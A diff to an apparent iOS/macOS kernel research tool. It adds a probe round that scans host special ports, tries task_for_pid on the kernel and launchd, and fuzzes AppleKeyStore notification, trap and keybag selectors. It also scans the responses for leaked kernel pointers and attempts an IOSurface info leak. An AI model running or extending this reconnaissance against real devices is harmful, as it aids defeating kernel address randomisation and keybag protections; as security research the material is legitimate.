@@ -4295,6 +4295,262 @@ static void r297_probe(void) {
  *   3. Try sel 0,1,16 with crafted input payloads
  *   4. Try trustd/securityd XPC to query entitlements and keybag state
  */
+static void r304_probe(void) {
+    rlog("\n=== r304: AKS Notifications + Traps + Kernel Port Probes ===\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: host_get_special_port probing ---- */
+    rlog("--- Part 1: host_get_special_port scan ---\n");
+    mach_port_t hostPort = mach_host_self();
+    for (int port_id = 0; port_id <= 12; port_id++) {
+        mach_port_t sp = MACH_PORT_NULL;
+        kr = host_get_special_port(hostPort, 0, port_id, &sp);
+        if (kr == KERN_SUCCESS && sp != MACH_PORT_NULL) {
+            rlog("  port_id=%d: 0x%x (kr=0x%x)\n", port_id, sp, kr);
+            mach_port_deallocate(mach_task_self(), sp);
+        } else if (kr != KERN_SUCCESS) {
+            rlog("  port_id=%d: DENIED kr=0x%x\n", port_id, kr);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: task_for_pid probe ---- */
+    rlog("\n--- Part 2: task_for_pid ---\n");
+    {
+        mach_port_t tfp = MACH_PORT_NULL;
+        kr = task_for_pid(mach_task_self(), 0, &tfp);
+        rlog("  task_for_pid(0/kernel): kr=0x%x port=0x%x\n", kr, tfp);
+        kr = task_for_pid(mach_task_self(), 1, &tfp);
+        rlog("  task_for_pid(1/launchd): kr=0x%x port=0x%x\n", kr, tfp);
+        kr = task_for_pid(mach_task_self(), getpid(), &tfp);
+        rlog("  task_for_pid(self/%d): kr=0x%x port=0x%x\n", getpid(), kr, tfp);
+        if (tfp) mach_port_deallocate(mach_task_self(), tfp);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: AKS Notification Port ---- */
+    rlog("\n--- Part 3: AKS IOConnectSetNotificationPort ---\n");
+    io_service_t aksSvc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("AppleKeyStore"));
+    io_connect_t aksConn = IO_OBJECT_NULL;
+    if (aksSvc) {
+        kr = IOServiceOpen(aksSvc, mach_task_self(), 0, &aksConn);
+        rlog("  AKS open: kr=0x%x conn=0x%x\n", kr, aksConn);
+    }
+    if (aksConn) {
+        /* Create a notification port */
+        IONotificationPortRef notifyPort = IONotificationPortCreate(kIOMasterPortDefault);
+        rlog("  NotificationPort: %p\n", (void*)notifyPort);
+
+        if (notifyPort) {
+            mach_port_t machPort = IONotificationPortGetMachPort(notifyPort);
+            rlog("  MachPort: 0x%x\n", machPort);
+
+            /* Try setting notification port for different types */
+            for (uint32_t notifType = 0; notifType < 8; notifType++) {
+                kr = IOConnectSetNotificationPort(aksConn, notifType, machPort, 0);
+                if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                    rlog("  SetNotificationPort type=%u: kr=0x%x\n", notifType, kr);
+                }
+            }
+
+            /* Check if any notifications arrived */
+            struct {
+                mach_msg_header_t hdr;
+                uint8_t body[512];
+            } nmsg = {0};
+            nmsg.hdr.msgh_size = sizeof(nmsg);
+            nmsg.hdr.msgh_local_port = machPort;
+            kr = mach_msg(&nmsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                          0, sizeof(nmsg), machPort, 200, MACH_PORT_NULL);
+            rlog("  Notification recv: kr=0x%x", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog(" id=0x%x size=%u", nmsg.hdr.msgh_id, nmsg.hdr.msgh_size);
+                /* Dump notification data for pointer scan */
+                size_t dLen = nmsg.hdr.msgh_size;
+                if (dLen > sizeof(nmsg)) dLen = sizeof(nmsg);
+                rlog("\n  Notif data: ");
+                for (size_t i = 0; i < dLen && i < 64; i++)
+                    rlog("%02x", ((uint8_t*)&nmsg)[i]);
+                /* Scan for kernel pointers in notification */
+                uint64_t *qw = (uint64_t*)&nmsg;
+                for (size_t i = 0; i < dLen/8; i++) {
+                    if ((qw[i] >> 36) == 0xfffffff || (qw[i] >> 32) == 0xfffffe00) {
+                        rlog("\n  ** KPTR in notif at off %zu: 0x%llx **", i*8, qw[i]);
+                    }
+                }
+            }
+            rlog("\n");
+            IONotificationPortDestroy(notifyPort);
+        }
+        fflush(stdout);
+
+        /* ---- Part 4: IOConnectTrap (fast path) ---- */
+        rlog("\n--- Part 4: AKS IOConnectTrap ---\n");
+        typedef uint64_t (*trap6_fn)(mach_port_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+        void *iokit_h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+        trap6_fn trap6 = iokit_h ? (trap6_fn)dlsym(iokit_h, "IOConnectTrap6") : NULL;
+        rlog("  IOConnectTrap6: %p\n", (void*)trap6);
+        if (trap6) {
+            for (uint32_t trap = 0; trap < 16; trap++) {
+                uint64_t ret = trap6(aksConn, trap, 0, 0, 0, 0, 0, 0);
+                if (ret != 0 && ret != (uint64_t)-1 &&
+                    ret != 0xe00002c2 && ret != 0xe00002bc) {
+                    rlog("  trap=%u: ret=0x%llx\n", trap, ret);
+                    if ((ret >> 36) == 0xfffffff) {
+                        rlog("    ** KERNEL ADDRESS LEAKED: 0x%llx **\n", ret);
+                    }
+                }
+            }
+        }
+        fflush(stdout);
+
+        /* ---- Part 5: AKS with proper keybag protocol ---- */
+        rlog("\n--- Part 5: AKS keybag protocol ---\n");
+        {
+            /* AppleKeyStore struct format:
+             * uint32_t opcode
+             * uint32_t handle (keybag handle, -1 or 0 for system)
+             * uint32_t key_class
+             * uint8_t  key_data[...]
+             *
+             * Try getting system keybag info */
+            struct {
+                uint32_t opcode;
+                uint32_t handle;
+                uint32_t key_class;
+                uint32_t flags;
+                uint8_t  pad[112];
+            } aks_req;
+
+            /* Op 0: Get keybag version/info */
+            for (uint32_t op = 0; op < 10; op++) {
+                memset(&aks_req, 0, sizeof(aks_req));
+                aks_req.opcode = op;
+                aks_req.handle = 0xFFFFFFFF; /* system keybag */
+
+                char resp[4096] = {0};
+                size_t respSz = sizeof(resp);
+                kr = IOConnectCallStructMethod(aksConn, 0,
+                    &aks_req, sizeof(aks_req), resp, &respSz);
+                rlog("  sel=0 op=%u handle=-1: kr=0x%x respSz=%zu", op, kr, respSz);
+                if (kr == KERN_SUCCESS && respSz > 0) {
+                    int nz = 0;
+                    for (size_t j = 0; j < respSz && j < 128; j++)
+                        if (resp[j]) nz++;
+                    if (nz) {
+                        rlog(" DATA=");
+                        for (size_t j = 0; j < 64 && j < respSz; j++)
+                            rlog("%02x", (uint8_t)resp[j]);
+                        /* Pointer scan */
+                        for (size_t j = 0; j + 8 <= respSz; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, resp + j, 8);
+                            if ((v >> 36) == 0xfffffff) {
+                                rlog("\n    ** KPTR@%zu: 0x%llx **", j, v);
+                            }
+                        }
+                    }
+                }
+                rlog("\n");
+            }
+
+            /* Try with handle=0 (might be a valid handle index) */
+            for (uint32_t op = 0; op < 10; op++) {
+                memset(&aks_req, 0, sizeof(aks_req));
+                aks_req.opcode = op;
+                aks_req.handle = 0;
+                aks_req.key_class = 6; /* class A (AfterFirstUnlock) */
+
+                char resp[4096] = {0};
+                size_t respSz = sizeof(resp);
+                kr = IOConnectCallStructMethod(aksConn, 0,
+                    &aks_req, sizeof(aks_req), resp, &respSz);
+                if (kr != KERN_SUCCESS || respSz == 0) continue;
+                int nz = 0;
+                for (size_t j = 0; j < respSz && j < 128; j++)
+                    if (resp[j]) nz++;
+                if (nz) {
+                    rlog("  sel=0 op=%u h=0 cls=6: respSz=%zu DATA=", op, respSz);
+                    for (size_t j = 0; j < 64 && j < respSz; j++)
+                        rlog("%02x", (uint8_t)resp[j]);
+                    rlog("\n");
+                }
+            }
+        }
+        fflush(stdout);
+
+        /* ---- Part 6: IOSurfaceRoot info leak attempt ---- */
+        rlog("\n--- Part 6: IOSurface property info leak ---\n");
+        io_service_t surfSvc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (surfSvc) {
+            io_connect_t surfConn = IO_OBJECT_NULL;
+            kr = IOServiceOpen(surfSvc, mach_task_self(), 0, &surfConn);
+            if (kr == KERN_SUCCESS && surfConn) {
+                /* Create a surface and read all its properties */
+                CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                int w = 32, h = 32, bpe = 4, bpr = 128;
+                CFNumberRef wRef = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hRef = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef bpeRef = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                CFNumberRef bprRef = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                int pf = 0x42475241; /* BGRA */
+                CFNumberRef pfRef = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wRef);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hRef);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bpeRef);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), bprRef);
+                CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfRef);
+                int allocSz = w * h * bpe;
+                CFNumberRef aszRef = CFNumberCreate(NULL, kCFNumberIntType, &allocSz);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), aszRef);
+
+                IOSurfaceRef surf = IOSurfaceCreate(props);
+                rlog("  Created IOSurface: %p\n", (void*)surf);
+                if (surf) {
+                    uint32_t sid = IOSurfaceGetID(surf);
+                    rlog("  SurfaceID: %u\n", sid);
+
+                    /* Get all properties back and check for kernel addresses */
+                    CFDictionaryRef allProps = NULL;
+                    IOSurfaceRef lsurf = IOSurfaceLookup(sid);
+                    if (lsurf) {
+                        rlog("  Lookup succeeded: %p\n", (void*)lsurf);
+                        /* Try IOSurfaceCopyAllValues - might leak internal addresses */
+                        /* Not available, try IOSurfaceGetPropertyMaximum etc */
+                        size_t allocSzR = IOSurfaceGetAllocSize(lsurf);
+                        rlog("  AllocSize: %zu\n", allocSzR);
+                        void *baseAddr = IOSurfaceGetBaseAddress(lsurf);
+                        rlog("  BaseAddress: %p\n", baseAddr);
+                        uint32_t seed = IOSurfaceGetSeed(lsurf);
+                        rlog("  Seed: %u\n", seed);
+                        int useCount = IOSurfaceGetUseCount(lsurf);
+                        rlog("  UseCount: %d\n", useCount);
+                        CFRelease(lsurf);
+                    }
+                    CFRelease(surf);
+                }
+                CFRelease(props); CFRelease(wRef); CFRelease(hRef);
+                CFRelease(bpeRef); CFRelease(bprRef); CFRelease(pfRef); CFRelease(aszRef);
+                IOServiceClose(surfConn);
+            }
+            IOObjectRelease(surfSvc);
+        }
+        fflush(stdout);
+
+        IOServiceClose(aksConn);
+    }
+    if (aksSvc) IOObjectRelease(aksSvc);
+
+    rlog("\n=== r304 complete ===\n");
+    fflush(stdout);
+}
+
 static void r303_probe(void) {
     rlog("\n=== r303: AKS Buffer Dump + Extended Scan ===\n\n");
     fflush(stdout);
@@ -31223,6 +31479,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 304) {
+            rlog("*** rounds=304: AKS notifications + traps + kernel port probes ***\n");
+            rlog("  r303: buffers all zeros, 80+ sels need privilege.\n");
+            rlog("  Probe: notif ports, IOConnectTrap, host_special_port, keybag proto.\n\n");
+            r304_probe();
             goto done;
         }
         if (rounds == 303) {
